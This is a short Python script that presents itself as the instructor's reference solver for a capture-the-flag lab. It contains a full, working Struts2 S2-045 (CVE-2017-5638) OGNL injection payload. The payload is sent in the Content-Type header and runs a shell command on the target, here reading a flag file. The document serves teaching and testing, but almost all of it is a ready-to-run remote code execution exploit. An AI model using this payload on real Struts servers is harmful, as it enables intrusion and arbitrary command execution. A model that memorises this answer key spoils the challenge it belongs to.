#!/usr/bin/env python3
"""Reference solver (instructor material) for the Hengyuan challenge.

Recovers the edge-reachable milestone flag (dmz-foothold) via Struts2 S2-045
(CVE-2017-5638) against the supplier vhost, reading /opt/supplier/flag.txt.
The remaining flags (customer-pii / oa-approval-race / uber-git-history) require
pivoting into the internal networks; see instructor/walkthrough.md.

Usage: python3 solve.py --url https://<container_addr>
Uses curl -k (lab edge presents a self-signed certificate).
"""
import argparse
import re
import subprocess
import sys

OGNL = (
    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
    "(#context.setMemberAccess(#dm)))).(#cmd='cat /opt/supplier/flag.txt')."
    "(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true))."
    "(#process=#p.start()).(#resp=@org.apache.struts2.ServletActionContext@getResponse())."
    "(#ros=#resp.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    "(#ros.flush()).(#resp.flushBuffer())}"
)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="container_addr, e.g. https://172.18.0.1:32768")
    args = ap.parse_args()
    url = args.url.rstrip("/") + "/index.action"
    r = subprocess.run(
        ["curl", "-sk", "-X", "POST", url,
         "-H", "Host: supplier.hengyuan.local",
         "-H", f"Content-Type: {OGNL}"],
        capture_output=True, text=True, timeout=30,
    )
    m = re.search(r"flag\{[^}]+\}", r.stdout)
    if not m:
        print("S2-045 did not return a flag:", r.stdout[:200], file=sys.stderr)
        sys.exit(1)
    print(m.group(0))


if __name__ == "__main__":
    main()